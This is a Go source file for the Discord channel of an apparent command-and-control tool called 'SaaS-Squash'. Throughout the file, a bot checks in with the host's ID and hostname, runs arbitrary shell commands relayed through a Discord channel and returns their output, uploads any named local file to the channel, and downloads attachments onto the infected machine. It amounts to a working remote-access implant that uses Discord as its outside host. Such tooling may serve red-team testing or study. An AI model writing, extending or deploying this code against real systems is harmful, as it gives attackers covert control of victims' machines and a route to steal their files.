package discord

import (
	"SaaS-Squash/common"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/bwmarrin/discordgo"
)

func Start() error {

	common.AllC2Configs.Debug.LogDebug("Discord: hostID: " + common.AllC2Configs.UUID.HostID)
	session, err := discordgo.New("Bot " + common.AllC2Configs.Discord.Token)
	if err != nil {
		common.AllC2Configs.Debug.LogDebugError("Discord - error creating Discord session: ", err)
	}
	session.AddHandler(handleMessage)

	err = session.Open()
	if err != nil {
		common.AllC2Configs.Debug.LogDebugError("Discord - error opening Discord session: ", err)
		return err
	}

	common.AllC2Configs.Debug.LogDebug("Discord - Bot is now running. Press CTRL-C to exit.")
	select {}
}

func handleMessage(session *discordgo.Session, message *discordgo.MessageCreate) {
	if strings.HasPrefix(message.Content, "checkin") {
		feedback, err := session.ChannelMessageSend(message.ChannelID, "Bot HostID: "+common.AllC2Configs.UUID.HostID+"\n Bot hostname: "+common.AllC2Configs.UUID.HostName)
		if err != nil {
			common.AllC2Configs.Debug.LogDebugError("Discord - error sending message: ", err)
			return
		}
		common.AllC2Configs.Debug.LogDebug("Message sent: " + feedback.Content)
	} else {

		if strings.HasPrefix(message.Content, common.AllC2Configs.UUID.HostID) {
			command := strings.TrimSpace(strings.TrimPrefix(message.Content, string(common.AllC2Configs.UUID.HostID)))
			switch {
			case strings.HasPrefix(command, common.AllC2Configs.Discord.Upload):

				command = strings.TrimSpace(strings.TrimPrefix(command, common.AllC2Configs.Discord.Upload))
				file, err := os.Open(command)
				if err != nil {
					session.ChannelMessageSend(message.ChannelID, "Error: "+err.Error())
					return
				}

				session.ChannelMessageSend(message.ChannelID, "uploading file: "+command)
				session.ChannelFileSend(message.ChannelID, command, file)
				session.ChannelMessageSend(message.ChannelID, "upload complete")
				return

			case strings.HasPrefix(command, common.AllC2Configs.Discord.Download):

				DownloadLatestAttachment(session, message)
				return

			default:

				output, err := common.ExecuteCommand(command)

				if err != nil {
					session.ChannelMessageSend(message.ChannelID, "Error: "+err.Error())
					return
				}
				common.AllC2Configs.Debug.LogDebug("output follows: \n" + output)
				session.ChannelMessageSend(message.ChannelID, string(output))
				return

			}
		}
	}
}

func DownloadLatestAttachment(s *discordgo.Session, m *discordgo.MessageCreate) {
	var lastMessageID string

	for {
		// Get the last 100 messages from the channel, starting from the last fetched message
		messages, err := s.ChannelMessages(m.ChannelID, 100, lastMessageID, "", "")
		if err != nil {
			// handle error
			return
		}

		// If there are no more messages, stop
		if len(messages) == 0 {
			break
		}

		// Update the ID of the last fetched message
		lastMessageID = messages[len(messages)-1].ID

		// Iterate over the messages (from newest to oldest)
		for _, message := range messages {
			// Check if the message is from the user who issued the command and has attachments
			if !message.Author.Bot && len(message.Attachments) > 0 {
				// Download the first attachment of the message
				response, err := http.Get(message.Attachments[0].URL)
				if err != nil {
					// handle error
					return
				}
				defer response.Body.Close()

				// Create the file
				filePath := strings.Join([]string{"./", message.Attachments[0].Filename}, "")
				out, err := os.Create(filePath)
				if err != nil {
					// handle error
					return
				}
				defer out.Close()

				// Write the body to file
				_, err = io.Copy(out, response.Body)
				if err != nil {
					// handle error
					return
				}

				// Get the absolute file path
				absPath, err := filepath.Abs(filePath)
				if err != nil {
					// handle error
					return
				}

				// Send a message to the channel
				s.ChannelMessageSend(m.ChannelID, "File "+message.Attachments[0].Filename+" has been successfully downloaded to "+absPath)

				// Stop after downloading the latest file
				return
			}
		}
	}
}
